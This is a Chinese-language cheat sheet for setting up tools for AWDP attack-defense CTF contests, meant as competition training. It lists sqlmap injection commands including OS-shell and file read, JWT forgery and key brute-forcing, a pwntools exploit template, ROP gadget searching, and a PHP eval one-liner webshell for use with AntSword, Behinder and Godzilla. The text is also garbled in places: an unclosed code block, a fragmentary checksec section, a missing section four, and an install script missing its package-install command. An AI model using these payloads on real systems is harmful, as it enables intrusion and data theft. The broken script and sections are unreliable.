# AWDP 常用工具与环境配置

## 一、赛前环境准备清单

### 必备系统
- **Linux 虚拟机**（推荐 Ubuntu 22.04）— 做题主力
- **Windows 主机** — 跑 IDA Pro、Burp Suite
- 确保两个系统之间可以互传文件（共享文件夹 / scp）

### 网络准备
- 比赛 VPN 客户端（通常赛方提供，OpenVPN 居多）
- 提前测试 VPN 连接
- 准备好代理工具（Burp Suite 代理配置）

## 二、Web 方向工具

### 2.1 Burp Suite（必备）

用途：抓包、改包、重放请求

```
关键功能：
- Proxy → 拦截和修改 HTTP 请求
- Repeater → 反复发送修改后的请求（测试 payload）
- Intruder → 批量爆破/Fuzz
- Decoder → 编解码工具
```

快速配置：
```
1. 浏览器设置代理 127.0.0.1:8080
2. 安装 Burp CA 证书（访问 http://burp）
3. 推荐浏览器插件：FoxyProxy（快速切换代理）
```

### 2.2 sqlmap（SQL 注入神器）

```bash
# 基础用法
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T flag --dump

# POST 请求
sqlmap -u "http://target/login" --data="user=admin&pass=123" --dbs

# 指定注入点
sqlmap -u "http://target/page?id=1*" --dbs  # * 标记注入点

# 常用参数
--batch          # 自动选择默认选项
--level=5        # 最高检测等级
--risk=3         # 最高风险等级
--tamper=space2comment  # 绕过 WAF
--os-shell       # 获取系统 shell
--file-read=/flag  # 读文件
```

### 2.3 dirsearch / gobuster（目录扫描）

```bash
# dirsearch
python3 dirsearch.py -u http://target/ -e php,txt,bak

# gobuster
gobuster dir -u http://target/ -w /usr/share/wordlists/dirb/common.txt
```

### 2.4 hackbar / curl（快速测试）

```bash
# curl 发送 POST 请求
curl -X POST http://target/login -d "user=admin&pass=123"

# curl 带 Cookie
curl -b "session=abc123" http://target/admin

# curl 上传文件
curl -F "file=@shell.php" http://target/upload
```

### 2.5 中国蚁剑 / 冰蝎 / 哥斯拉

```
用途：Webshell 管理工具
- 蚁剑（AntSword）：开源，支持多种编码器
- 冰蝎（Behinder）：加密流量，不易被检测
- 哥斯拉（Godzilla）：支持多种 payload 类型

配合一句话木马使用：
<?php eval($_POST['cmd']); ?>
```

### 2.6 jwt_tool（JWT 攻击工具）

```bash
# 安装
git clone https://github.com/ticarpi/jwt_tool ~/jwt_tool
pip3 install -r ~/jwt_tool/requirements.txt

# 常用命令
python3 jwt_tool.py <token>              # 解析 JWT
python3 jwt_tool.py <token> -T           # 篡改 payload（交互式）
python3 jwt_tool.py <token> -C -d rockyou.txt  # 爆破密钥
python3 jwt_tool.py <token> -X a         # alg:none 攻击
python3 jwt_tool.py <token> -X k -pk public.pem  # RS256→HS256 密钥混淆
```

### 2.7 CyberChef（编解码瑞士军刀）

```
在线工具：https://gchq.github.io/CyberChef/
也可以离线部署，比赛时断网也能用

常用功能：
- Base64 编解码
- URL 编解码
- Hex 编解码
- JWT 解析
- 各种加密/哈希
- 支持拖拽组合多步操作（Recipe）

## 三、Pwn 方向工具

### 3.1 pwntools（Python 库，必备）

```bash
pip install pwntools
```

```python
from pwn import *

# 基础模板
context(arch='amd64', os='linux', log_level='debug')
p = remote('ip', port)
# p = process('./pwn1')

elf = ELF('./pwn1')
libc = ELF('./libc.so.6')

# ... exploit code ...

p.interactive()
```

### 3.2 GDB + pwndbg/peda/gef

```bash
# 安装 pwndbg（推荐）
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# 常用命令
gdb ./pwn1
b *0x401234          # 下断点
r                    # 运行
c                    # 继续
n / ni               # 单步（源码级 / 指令级）
s / si               # 步入
x/20gx $rsp          # 查看栈
vmmap                # 查看内存映射
heap                 # 查看堆状态
bins                 # 查看 free bins
telescope $rsp 20    # 查看栈内容（pwndbg）
cyclic 200           # 生成 pattern
cyclic -l 0x61616166 # 计算偏移
```

### 3.3 IDA Pro / Ghidra

```
IDA Pro：
- 反编译 C 伪代码（F5）
- 查看函数列表、字符串、交叉引用
- Keypatch 插件做 binary patch
- 快捷键：G（跳转地址）、X（交叉引用）、N（重命名）

Ghidra（免费替代）：
- 功能类似 IDA
- 自带 patch 功能
- 支持脚本（Java/Python）
```

### 3.4 ROPgadget / ropper / one_gadget

```bash
# 查找 ROP gadget
ROPgadget --binary pwn1 | grep "pop rdi"
ROPgadget --binary pwn1 --ropchain

# ropper（更快）
ropper --file pwn1 --search "pop rdi"

# one_gadget（找 libc 中的一键 getshell 地址）
one_gadget libc.so.6
# 输出类似：
# 0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
# constraints: rsp & 0xf == 0, rcx == NULL
```

### 3.5 seccomp-tools（检测沙箱规则）

```bash
# 安装
gem install seccomp-tools

# 查看程序的 seccomp 规则
seccomp-tools dump ./pwn1

# 输出示例：
#  0000: A = arch
#  0001: if (A != ARCH_X86_64) goto 0009
#  0002: A = sys_number
#  0003: if (A == execve) goto 0009      ← 禁止 execve
#  0004: if (A == execveat) goto 0009    ← 禁止 execveat
#  ...
#  0008: return ALLOW
#  0009: return KILL

# 看到禁止 execve → 需要用 ORW（open/read/write）方式读 flag
```

### 3.6 LibcSearcher / libc-database

```bash
# 当题目不给 libc 时，通过泄露的函数地址查找 libc 版本

# 方法 1：LibcSearcher（Python 库）
pip install LibcSearcher

# 方法 2：在线查询
# https://libc.blukat.me/
# https://libc.rip/
# 输入：函数名 + 地址末三位 → 匹配 libc 版本

# 方法 3：patchelf 替换 libc 本地调试
patchelf --set-interpreter ./ld-2.31.so ./pwn1
patchelf --replace-needed libc.so.6 ./libc-2.31.so ./pwn1
```

### 3.7 checksec pwn1

# NX:       NX enabled
# PIE:      No PIE (0x400000)

## 五、赛前工具安装一键脚本

```bash
#!/bin/bash
# AWDP 赛前环境快速配置（Ubuntu）

    python3 python3-pip \
    gdb gdbserver \
    netcat-openbsd \
    curl wget \
    vim tmux \
    binwalk \
    openvpn

# pwntools
pip3 install pwntools

git clone https://github.com/pwndbg/pwndbg ~/pwndbg
cd ~/pwndbg && ./setup.sh

# ROPgadget
pip3 install ROPgadget

# one_gadget
sudo apt install -y ruby
sudo gem install one_gadget

# seccomp-tools
sudo gem install seccomp-tools

# jwt_tool
git clone https://github.com/ticarpi/jwt_tool ~/jwt_tool
pip3 install -r ~/jwt_tool/requirements.txt

# Ghidra（需要 JDK）
sudo apt install -y default-jdk

git clone https://github.com/sqlmapproject/sqlmap ~/sqlmap

# dirsearch
git clone https://github.com/maurosoria/dirsearch ~/dirsearch

echo "环境配置完成！"

## 六、比赛时的终端布局建议

```
推荐使用 tmux 分屏：

┌──────────────────┬──────────────────┐
│                  │                  │
│   代码审计/IDA    │   exploit 编写    │
│                  │                  │
├──────────────────┼──────────────────┤
│                  │                  │
│   GDB 调试       │   nc/交互终端     │
│                  │                  │
└──────────────────┴──────────────────┘

tmux 常用快捷键（前缀 Ctrl+B）：
%  → 左右分屏
"  → 上下分屏
方向键 → 切换窗格
z  → 全屏/还原当前窗格
d  → 后台运行
```
